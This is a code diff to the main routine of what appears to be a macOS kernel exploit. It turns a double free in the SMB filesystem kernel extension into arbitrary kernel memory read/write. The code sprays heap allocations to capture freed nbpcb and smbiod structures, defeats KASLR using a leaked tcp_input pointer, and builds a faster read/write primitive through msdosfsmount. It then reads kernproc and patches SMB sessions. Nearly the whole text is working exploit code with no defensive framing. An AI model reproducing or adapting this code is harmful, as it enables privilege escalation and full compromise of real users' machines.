@@ -37,6 +37,7 @@
 #include "kmem/zkext_prime_util.h"
 
 #include "util_binary.h"
+#include "util_log.h"
 
 
 #define NUM_SMB_SERVER_PORTS 64
@@ -154,39 +155,46 @@ int main(void) {
     inet_aton("127.0.0.1", &smb_addr.sin_addr);
     
     int error = 0;
-    int server_pid = find_server_pid();
+    int xepg_smbserver_pid = find_server_pid();
+    xe_log_info("found xepg_smbserver at pid: %d", xepg_smbserver_pid);
+    
     kmem_neighbor_reader_t neighbor_reader = kmem_neighbor_reader_create(&smb_addr);
-    kmem_zkext_free_session_t zkext_free_session = kmem_zkext_free_session_create(&smb_addr);
     
-    struct complete_nic_info_entry dbf_entry = kmem_zkext_free_session_prepare(zkext_free_session);
-    xe_assert(dbf_entry.possible_connections.tqh_first == NULL);
+    xe_log_info("start leaking struct nbpbc");
+    kmem_zkext_free_session_t nbpcb_free_session = kmem_zkext_free_session_create(&smb_addr);
+    struct complete_nic_info_entry double_free_nic = kmem_zkext_free_session_prepare(nbpcb_free_session);
+    xe_assert(double_free_nic.possible_connections.tqh_first == NULL);
+    xe_log_debug("leaked struct complete_nic_info_entry with nic_index %llu for double free", double_free_nic.nic_index);
     
-    struct complete_nic_info_entry* fake_entry = alloca(256 - 8 - 1);
-    bzero(fake_entry, 256 - 8 - 1);
-    fake_entry->next.next = NULL;
-    fake_entry->next.prev = (void*)((uintptr_t)dbf_entry.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
+    struct complete_nic_info_entry* fake_nic = alloca(256 - 8 - 1);
+    bzero(fake_nic, 256 - 8 - 1);
+    fake_nic->next.next = NULL;
+    fake_nic->next.prev = (void*)((uintptr_t)double_free_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
     
-    struct kmem_zkext_alloc_small_entry allocated_entry = kmem_zkext_alloc_small(&smb_addr, neighbor_reader, (char*)fake_entry + 8, 256 - 8 - 1);
+    struct kmem_zkext_alloc_small_entry kext_256_element = kmem_zkext_alloc_small(&smb_addr, neighbor_reader, (char*)fake_nic + 8, 256 - 8 - 1);
+    xe_log_debug("allocated kext.256 element with fake complete_nic_info_entry at %p", (void*)kext_256_element.address);
     
-    dbf_entry.next.next = (void*)allocated_entry.address;
-    dbf_entry.addr_list.tqh_first = NULL;
+    double_free_nic.next.next = (void*)kext_256_element.address;
+    double_free_nic.addr_list.tqh_first = NULL;
     
-    uint num_rw_allocs = 256;
-    kmem_allocator_rw_t rw_allocator = kmem_allocator_rw_create(&smb_addr, num_rw_allocs);
-    uint num_capture_fds = 256;
-    int* capture_fds = alloca(sizeof(int) * num_capture_fds);
-    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
-        capture_fds[index] = smb_client_open_dev();
+    uint num_nbpcb_rw_capture_allocations = 512;
+    kmem_allocator_rw_t nbpcb_rw_capture_allocator = kmem_allocator_rw_create(&smb_addr, num_nbpcb_rw_capture_allocations / 2);
+    
+    uint num_nbpcb_capture_allocations = 256;
+    int* nbpcb_capture_allocators = alloca(sizeof(int) * num_nbpcb_capture_allocations);
+    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
+        nbpcb_capture_allocators[index] = smb_client_open_dev();
     });
     
     kmem_zkext_prime_util_t pre_allocator = kmem_zkext_prime_util_create(&smb_addr);
     kmem_zkext_prime_util_prime(pre_allocator, 128, 255);
     
-    kmem_zkext_free_session_execute(zkext_free_session, &dbf_entry);
+    xe_log_debug("begin free of allocated kext.256 element retaining read reference");
+    kmem_zkext_free_session_execute(nbpcb_free_session, &double_free_nic);
     
     char* data = alloca(256);
     memset(data, 0xff, 256);
-    error = kmem_allocator_rw_allocate(rw_allocator, num_rw_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
+    error = kmem_allocator_rw_allocate(nbpcb_rw_capture_allocator, num_nbpcb_rw_capture_allocations / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
         *data1 = data;
         *data1_size = 256;
         *data2 = data;
@@ -194,30 +202,28 @@ int main(void) {
     }, NULL);
     xe_assert_err(error);
     
-    printf("ok\n");
-    
     int64_t found_index = -1;
-    error = kmem_allocator_prpw_filter(allocated_entry.element_allocator, 0, kmem_allocator_prpw_get_capacity(allocated_entry.element_allocator), ^bool(void* ctx, sa_family_t family, size_t index) {
+    error = kmem_allocator_prpw_filter(kext_256_element.element_allocator, 0, kmem_allocator_prpw_get_capacity(kext_256_element.element_allocator), ^bool(void* ctx, sa_family_t family, size_t index) {
         return family == 0xff;
     }, NULL, &found_index);
     xe_assert_err(error);
     xe_assert(found_index >= 0);
+    xe_log_debug("done free of allocated kext.256 element while retaining read reference");
     
-    printf("ok\n");
-    
-    error = kmem_allocator_prpw_release_containing_backend(allocated_entry.element_allocator, found_index);
+    xe_log_debug("begin capturing freed kext.256 element with struct nbpcb");
+    error = kmem_allocator_prpw_release_containing_backend(kext_256_element.element_allocator, found_index);
     xe_assert_err(error);
     
-    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
+    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
         struct sockaddr_in addr = smb_addr;
-        addr.sin_port = htons(SMB_PORT_FOR_INDEX(&smb_addr, index, num_capture_fds));
-        int error = smb_client_ioc_negotiate(capture_fds[index], &addr, sizeof(addr), FALSE);
+        addr.sin_port = htons(SMB_PORT_FOR_INDEX(&smb_addr, index, num_nbpcb_capture_allocations));
+        int error = smb_client_ioc_negotiate(nbpcb_capture_allocators[index], &addr, sizeof(addr), FALSE);
         xe_assert_err(error);
     });
     
     found_index = -1;
     struct nbpcb* leaked_nbpcb = alloca(sizeof(struct nbpcb));
-    error = kmem_allocator_rw_filter(rw_allocator, 0, num_rw_allocs, 256, 256, ^bool(void* ctx, char* data1, char* data2, size_t index) {
+    error = kmem_allocator_rw_filter(nbpcb_rw_capture_allocator, 0, num_nbpcb_rw_capture_allocations / 2, 256, 256, ^bool(void* ctx, char* data1, char* data2, size_t index) {
         if (memcmp(data, data1, 256)) {
             memcpy(leaked_nbpcb, data1, sizeof(*leaked_nbpcb));
             return TRUE;
@@ -235,66 +241,79 @@ int main(void) {
     xe_assert_kaddr((uintptr_t)leaked_nbpcb->nbp_iod);
     
     struct sockaddr_in* nbpcb_addr = (struct sockaddr_in*)&leaked_nbpcb->nbp_sock_addr;
-    uint16_t nbpcb_port = find_lport_for_fport(server_pid, ntohs(nbpcb_addr->sin_port));
+    uint16_t nbpcb_fport = ntohs(nbpcb_addr->sin_port);
+    uint16_t nbpcb_lport = find_lport_for_fport(xepg_smbserver_pid, nbpcb_fport);
     
-    printf("smbiod: %p\n", (void*)leaked_nbpcb->nbp_iod);
-    printf("nbpcb fport: %d, lport: %d\n", ntohs(nbpcb_addr->sin_port), nbpcb_port);
+    xe_log_debug("done capturing freed kext.256 element with nbpcb");
+    xe_log_info("leaked npbcb with smbiod: %p, lport: %d and fport: %d", (void*)leaked_nbpcb->nbp_iod, nbpcb_lport, nbpcb_fport);
     
-    kmem_allocator_rw_disown_backend(rw_allocator, (int)found_index);
+    kmem_allocator_rw_disown_backend(nbpcb_rw_capture_allocator, (int)found_index);
     
-    error = kmem_allocator_rw_destroy(&rw_allocator);
+    error = kmem_allocator_rw_destroy(&nbpcb_rw_capture_allocator);
+    xe_assert_err(error);
+    error = kmem_allocator_prpw_destroy(&kext_256_element.element_allocator);
     xe_assert_err(error);
     
-    rw_allocator = kmem_allocator_rw_create(&smb_addr, num_rw_allocs);
-    zkext_free_session = kmem_zkext_free_session_create(&smb_addr);
-    dbf_entry = kmem_zkext_free_session_prepare(zkext_free_session);
+    xe_log_info("begin capturing struct smbiod for read write");
+    int num_smbiod_rw_capture_allocations = 512;
+    kmem_allocator_rw_t smbiod_rw_capture_allocators = kmem_allocator_rw_create(&smb_addr, num_smbiod_rw_capture_allocations / 2);
+    kmem_zkext_free_session_t smbiod_free_session = kmem_zkext_free_session_create(&smb_addr);
+    double_free_nic = kmem_zkext_free_session_prepare(smbiod_free_session);
+    xe_assert(double_free_nic.possible_connections.tqh_first == NULL);
+    xe_log_debug("leaked struct complete_nic_info_entry with nic_index %llu for double free", double_free_nic.nic_index);
     
-    struct complete_nic_info_entry* fake_iod_entry = alloca(sizeof(struct smbiod));
-    bzero(fake_iod_entry, sizeof(struct smbiod));
-    fake_iod_entry->next.prev = (void*)((uintptr_t)dbf_entry.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
-    dbf_entry.next.next = (void*)leaked_nbpcb->nbp_iod;
-    dbf_entry.addr_list.tqh_first = NULL;
+    fake_nic = alloca(sizeof(struct smbiod));
+    bzero(fake_nic, sizeof(struct smbiod));
+    fake_nic->next.prev = (void*)((uintptr_t)double_free_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
+    double_free_nic.next.next = (void*)leaked_nbpcb->nbp_iod;
+    double_free_nic.addr_list.tqh_first = NULL;
     
-    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
-        uint16_t port = SMB_PORT_FOR_INDEX(&smb_addr, index, num_capture_fds);
-        if (nbpcb_port == port) {
-            close(capture_fds[index]);
-            capture_fds[index] = -1;
+    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
+        uint16_t port = SMB_PORT_FOR_INDEX(&smb_addr, index, num_nbpcb_capture_allocations);
+        if (nbpcb_lport == port) {
+            close(nbpcb_capture_allocators[index]);
+            nbpcb_capture_allocators[index] = -1;
         }
     });
     
-    error = kmem_allocator_rw_allocate(rw_allocator, num_rw_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
-        *data1 = (char*)fake_iod_entry;
+    error = kmem_allocator_rw_allocate(smbiod_rw_capture_allocators, num_smbiod_rw_capture_allocations / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
+        *data1 = (char*)fake_nic;
         *data1_size = sizeof(struct smbiod);
-        *data2 = (char*)fake_iod_entry;
+        *data2 = (char*)fake_nic;
         *data2_size = sizeof(struct smbiod);
     }, NULL);
     xe_assert_err(error);
     
-    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
-        if (capture_fds[index] >= 0) {
-            close(capture_fds[index]);
+    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
+        if (nbpcb_capture_allocators[index] >= 0) {
+            close(nbpcb_capture_allocators[index]);
         }
-        capture_fds[index] = smb_client_open_dev();
     });
     
-    kmem_zkext_free_session_execute(zkext_free_session, &dbf_entry);
+    int num_smbiod_capture_allocations = 256;
+    int* smbiod_capture_allocators = alloca(sizeof(int) * num_smbiod_capture_allocations);
+    dispatch_apply(num_smbiod_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
+        smbiod_capture_allocators[index] = smb_client_open_dev();
+        xe_assert_cond(smbiod_capture_allocators[index], >=, 0);
+    });
     
-    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
-        int error = smb_client_ioc_negotiate(capture_fds[index], &smb_addr, sizeof(smb_addr), FALSE);
+    kmem_zkext_free_session_execute(smbiod_free_session, &double_free_nic);
+    
+    dispatch_apply(num_smbiod_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
+        int error = smb_client_ioc_negotiate(smbiod_capture_allocators[index], &smb_addr, sizeof(smb_addr), FALSE);
         xe_assert_err(error);
     });
     
     found_index = -1;
-    struct smbiod* leaked_iod = alloca(sizeof(struct smbiod));
-    error = kmem_allocator_rw_filter(rw_allocator, 0, num_rw_allocs, sizeof(struct smbiod), sizeof(struct smbiod), ^bool(void* ctx, char* data1, char* data2, size_t index) {
-        if (memcmp(data1, fake_iod_entry, sizeof(struct smbiod))) {
-            memcpy(leaked_iod, data1, sizeof(struct smbiod));
+    struct smbiod* leaked_smbiod = alloca(sizeof(struct smbiod));
+    error = kmem_allocator_rw_filter(smbiod_rw_capture_allocators, 0, num_smbiod_rw_capture_allocations / 2, sizeof(struct smbiod), sizeof(struct smbiod), ^bool(void* ctx, char* data1, char* data2, size_t index) {
+        if (memcmp(data1, fake_nic, sizeof(struct smbiod))) {
+            memcpy(leaked_smbiod, data1, sizeof(struct smbiod));
             return TRUE;
         }
         
-        if (memcmp(data2, fake_iod_entry, sizeof(struct smbiod))) {
-            memcpy(leaked_iod, data2, sizeof(struct smbiod));
+        if (memcmp(data2, fake_nic, sizeof(struct smbiod))) {
+            memcpy(leaked_smbiod, data2, sizeof(struct smbiod));
             return TRUE;
         }
         
@@ -302,49 +321,60 @@ int main(void) {
     }, NULL, &found_index);
     xe_assert_err(error);
     xe_assert(found_index >= 0);
-    xe_assert(XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)leaked_iod->iod_tdesc));
+    xe_assert(XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)leaked_smbiod->iod_tdesc));
+    xe_log_info("captured smbiod with tdesc %p", leaked_smbiod->iod_tdesc);
     
-    int rw_fd = kmem_allocator_rw_disown_backend(rw_allocator, (int)found_index);
-    kmem_allocator_rw_destroy(&rw_allocator);
+    int fd_smbiod_rw = kmem_allocator_rw_disown_backend(smbiod_rw_capture_allocators, (int)found_index);
+    kmem_allocator_rw_destroy(&smbiod_rw_capture_allocators);
+    xe_log_debug("smbiod read write captured by fd: %d", fd_smbiod_rw);
     
-    int* captured_fd = alloca(sizeof(int));
-    *captured_fd = -1;
-    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
+    int* fd_smbiod = alloca(sizeof(int));
+    *fd_smbiod = -1;
+    dispatch_apply(num_smbiod_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
         struct smbioc_multichannel_properties props;
         bzero(&props, sizeof(props));
-        int error = smb_client_ioc_multichannel_properties(capture_fds[index], &props);
+        int error = smb_client_ioc_multichannel_properties(smbiod_capture_allocators[index], &props);
         xe_assert_err(error);
-        if (props.iod_properties[0].iod_prop_id == leaked_iod->iod_id) {
-            *captured_fd = capture_fds[index];
+        if (props.iod_properties[0].iod_prop_id == leaked_smbiod->iod_id) {
+            *fd_smbiod = smbiod_capture_allocators[index];
         } else {
-            close(capture_fds[index]);
-            capture_fds[index] = -1;
+            close(smbiod_capture_allocators[index]);
+            smbiod_capture_allocators[index] = -1;
         }
     });
-    xe_assert(captured_fd >= 0);
+    xe_assert(*fd_smbiod >= 0);
+    xe_log_debug("captured smbiod owned by smb dev at fd: %d", *fd_smbiod);
+    xe_log_info("done capturing smbiod for read write");
     
-    printf("captured smbiod of fd: %d, read by fd: %d\n", *captured_fd, rw_fd);
-    
-    kmem_smbiod_rw_t smbiod_rw = kmem_smbiod_rw_create(&smb_addr, rw_fd, *captured_fd);
-    
+    kmem_smbiod_rw_t smbiod_rw = kmem_smbiod_rw_create(&smb_addr, fd_smbiod_rw, *fd_smbiod);
     xe_kmem_use_backend(xe_kmem_smbiod_create(smbiod_rw));
+    xe_log_info("kmem reader using smbiod created");
+    
+    xe_log_info("begin initializing kernel address slider");
     struct nbpcb nbpcb;
-    xe_kmem_read(&nbpcb, (uintptr_t)leaked_iod->iod_tdata, sizeof(nbpcb));
+    xe_kmem_read(&nbpcb, (uintptr_t)leaked_smbiod->iod_tdata, sizeof(nbpcb));
     uintptr_t socket = (uintptr_t)nbpcb.nbp_tso;
     uintptr_t protosw = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PROTO_OFFSET));
+    uintptr_t tcp_input = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET)));
+    xe_log_debug("found tcp_input function address: %p", (void*)tcp_input);
     
-    uintptr_t tcp_input = xe_kmem_read_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET));
-    tcp_input = XE_PTRAUTH_STRIP(tcp_input);
     int64_t text_exec_slide = tcp_input - FUNC_TCP_INPUT_ADDR;
+    xe_log_debug("calculated text_exec slide: %p", (void*)text_exec_slide);
+    
     int64_t text_slide = text_exec_slide + XE_IMAGE_SEGMENT_DATA_CONST_SIZE;
+    xe_log_debug("calculated text_slide: %p", (void*)text_slide);
+    
     uintptr_t mh_execute_header = VAR_MH_EXECUTE_HEADER_ADDR + text_slide;
+    xe_log_debug("calculated mh_execute_header address: %p", (void*)mh_execute_header);
     
-    printf("mh_execute_header: %p\n", (void*)mh_execute_header);
     xe_slider_init(mh_execute_header);
-    
     xe_assert(xe_slider_slide(FUNC_TCP_INPUT_ADDR) == tcp_input);
+    xe_log_info("done initializing kernel address slider");
     
     uintptr_t proc = xe_xnu_proc_current_proc();
+    xe_log_debug("current proc address: %p\n", (void*)proc);
+    
+    xe_log_info("begin initializing fast kmem reader using msdosfsmount");
     
     xe_allocator_msdosfs_t worker_allocator;
     error = xe_allocator_msdosfs_create("worker", &worker_allocator);
@@ -356,38 +386,6 @@ int main(void) {
     
     int fd_mount_worker = xe_allocator_msdsofs_get_mount_fd(worker_allocator);
     int fd_mount_helper = xe_allocator_msdsofs_get_mount_fd(helper_allocator);
-    
-    uintptr_t vnode_mount_worker;
-    error = xe_xnu_proc_find_fd_data(proc, fd_mount_worker, &vnode_mount_worker);
-    xe_assert_err(error);
-    
-    uintptr_t vnode_mount_helper;
-    error = xe_xnu_proc_find_fd_data(proc, fd_mount_helper, &vnode_mount_helper);
-    xe_assert_err(error);
-    
-    uintptr_t mount_worker = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET)));
-    uintptr_t mount_helper = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET)));
-    
-    printf("mount_worker: %p\n", (void*)mount_worker);
-    printf("mount_helper: %p\n", (void*)mount_helper);
-    
-    uintptr_t msdosfs_worker = xe_kmem_read_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
-    uintptr_t msdosfs_helper = xe_kmem_read_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
-    
-    printf("msdosfs_worker: %p\n", (void*)msdosfs_worker);
-    printf("msdosfs_helper: %p\n", (void*)msdosfs_helper);
-    
-    char backup_worker[368];
-    xe_kmem_read(backup_worker, msdosfs_worker, sizeof(backup_worker));
-    
-    printf("msdosfsmount worker: \n");
-    xe_util_binary_hex_dump(backup_worker, sizeof(backup_worker));
-    
-    char backup_helper[368];
-    xe_kmem_read(backup_helper, msdosfs_helper, sizeof(backup_helper));
-    
-    printf("msdosfsmount helper: \n");
-    xe_util_binary_hex_dump(backup_helper, sizeof(backup_helper));
     
     char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
     xe_assert(mkdtemp(temp_dir) != NULL);
@@ -401,18 +399,45 @@ int main(void) {
     int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
     xe_assert(helper_bridge_fd >= 0);
     
-    uintptr_t vnode_worker_bridge;
-    error = xe_xnu_proc_find_fd_data(proc, worker_bridge_fd, &vnode_worker_bridge);
-    xe_assert_err(error);
+    uint32_t fdesc_nfiles;
+    uintptr_t fdesc_ofiles = xe_xnu_proc_read_fdesc_ofiles(proc, &fdesc_nfiles);
+    xe_log_debug("proc fdesc_ofiles: %p and fdesc_nfiles: %d", (void*)fdesc_ofiles, fdesc_nfiles);
     
-    uintptr_t vnode_helper_bridge;
-    error = xe_xnu_proc_find_fd_data(proc, helper_bridge_fd, &vnode_helper_bridge);
-    xe_assert_err(error);
+    xe_assert_cond(fd_mount_worker, <, fdesc_nfiles);
+    uintptr_t vnode_mount_worker = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, fd_mount_worker);
+    xe_log_debug("vnode mount worker address: %p", (void*)vnode_mount_worker);
     
-    printf("vnode_worker_bridge: %p\n", (void*)vnode_worker_bridge);
-    printf("vnode_helper_bridge: %p\n", (void*)vnode_helper_bridge);
+    xe_assert_cond(fd_mount_helper, <, fdesc_nfiles);
+    uintptr_t vnode_mount_helper = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, fd_mount_helper);
+    xe_log_debug("vnode mount helper address: %p", (void*)vnode_mount_helper);
     
-    rw_allocator = kmem_allocator_rw_create(&smb_addr, num_rw_allocs);
+    uintptr_t mount_worker = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    xe_log_debug("mount worker address: %p", (void*)mount_worker);
+    
+    uintptr_t mount_helper = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET)));
+    xe_log_debug("mount helper address: %p", (void*)mount_helper);
+    
+    uintptr_t msdosfs_worker = xe_kmem_read_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
+    xe_log_debug("msdosfsmount worker address: %p", (void*)msdosfs_worker);
+    
+    uintptr_t msdosfs_helper = xe_kmem_read_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
+    xe_log_debug("msdosfsmount helper address: %p", (void*)msdosfs_helper);
+    
+    char backup_worker[368];
+    xe_kmem_read(backup_worker, msdosfs_worker, sizeof(backup_worker));
+    
+    printf("msdosfsmount worker: \n");
+    xe_log_debug_hexdump(backup_worker, sizeof(backup_worker), "msdosfsmount worker:");
+    
+    char backup_helper[368];
+    xe_kmem_read(backup_helper, msdosfs_helper, sizeof(backup_helper));
+    xe_log_debug_hexdump(backup_helper, sizeof(backup_helper), "msdosfsmount helper:");
+    
+    uintptr_t vnode_worker_bridge = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, worker_bridge_fd);
+    xe_log_debug("vnode worker bridge address: %p", (void*)vnode_worker_bridge);
+    
+    uintptr_t vnode_helper_bridge = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, helper_bridge_fd);
+    xe_log_debug("vnode helper bridge address: %p", (void*)vnode_helper_bridge);
     
     struct kmem_msdosfs_init_args args;
     bzero(&args, sizeof(args));
@@ -426,17 +451,22 @@ int main(void) {
     args.worker_msdosfs = msdosfs_worker;
     xe_allocator_msdosfs_get_mountpoint(worker_allocator, args.worker_mount_point, sizeof(args.worker_mount_point));
     xe_allocator_msdosfs_get_mountpoint(helper_allocator, args.helper_mount_point, sizeof(args.helper_mount_point));
+    
+    int num_msdosfs_rw_capture_allocators = 256;
+    kmem_allocator_rw_t msdosfs_rw_capture_allocators = kmem_allocator_rw_create(&smb_addr, num_msdosfs_rw_capture_allocators);
     args.helper_mutator = ^(void* ctx, char* data) {
+        xe_log_debug_hexdump(data, sizeof(args.helper_data), "replacing helper msdosfsmount with data: ");
         struct smbiod iod;
         kmem_smbiod_rw_read_iod(smbiod_rw, &iod);
         iod.iod_gss.gss_cpn = (uint8_t*)msdosfs_helper;
         iod.iod_gss.gss_cpn_len = sizeof(backup_helper);
         kmem_smbiod_rw_write_iod(smbiod_rw, &iod);
+        
         char any_data[32];
-        int error = smb_client_ioc_ssn_setup(*captured_fd, any_data, sizeof(any_data), any_data, sizeof(any_data));
+        int error = smb_client_ioc_ssn_setup(*fd_smbiod, any_data, sizeof(any_data), any_data, sizeof(any_data));
         xe_assert_err(error);
         
-        error = kmem_allocator_rw_allocate(rw_allocator, num_rw_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
+        error = kmem_allocator_rw_allocate(msdosfs_rw_capture_allocators, num_msdosfs_rw_capture_allocators, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
             *data1 = data;
             *data1_size = sizeof(args.helper_data);
             *data2 = data;
@@ -445,19 +475,20 @@ int main(void) {
         xe_assert_err(error);
     };
     args.helper_mutator_ctx = NULL;
-    xe_kmem_use_backend(xe_kmem_msdosfs_create(&args));
     
+    xe_kmem_use_backend(xe_kmem_msdosfs_create(&args));
     uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
-    printf("kernproc: %p\n", (void*)kernproc);
+    xe_assert_kaddr(kernproc);
+    xe_log_info("done initializing fast msdosfsmount based kmem read writer");
     
     xe_slider_kext_t smbfs_slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
     patch_smb_sessions(smbfs_slider);
-    kmem_allocator_rw_destroy(&rw_allocator);
-    close(*captured_fd);
-    close(rw_fd);
+    kmem_allocator_rw_destroy(&msdosfs_rw_capture_allocators);
+    close(*fd_smbiod);
+    close(fd_smbiod_rw);
     kmem_smbiod_rw_destroy(&smbiod_rw);
-    kmem_zkext_free_session_destroy(&zkext_free_session);
-    kmem_allocator_prpw_destroy(&allocated_entry.element_allocator);
+    kmem_zkext_free_session_destroy(&smbiod_free_session);
+    kmem_zkext_free_session_destroy(&nbpcb_free_session);
     
     struct xe_kmem_remote_server_ctx server_ctx;
     server_ctx.mh_execute_header = mh_execute_header;
